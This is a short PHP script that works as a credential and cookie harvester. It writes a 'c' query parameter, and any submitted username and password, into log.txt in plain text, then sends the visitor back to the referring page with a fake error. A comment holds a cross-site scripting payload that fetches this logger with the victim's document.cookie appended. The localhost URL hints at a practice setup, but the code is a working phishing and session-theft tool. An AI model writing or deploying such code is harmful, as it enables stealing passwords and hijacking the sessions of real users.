<?php
if (isset($_GET['c'])) {
    file_put_contents('log.txt', $_GET['c'] . "\n", FILE_APPEND);
}

if (isset($_POST['username'], $_POST['password'])) {
    $log = 'Username: ' . $_POST['username'] . ' - Password: ' . $_POST['password'];
    file_put_contents('log.txt', $log . "\n", FILE_APPEND);
    header('Location: ' . $_SERVER['HTTP_REFERER'] . '?error=1', TRUE, 302);
    exit;
}

// <script>fetch('http://localhost:63342/PHP/FormHandling/log.php' + document.cookie)</script>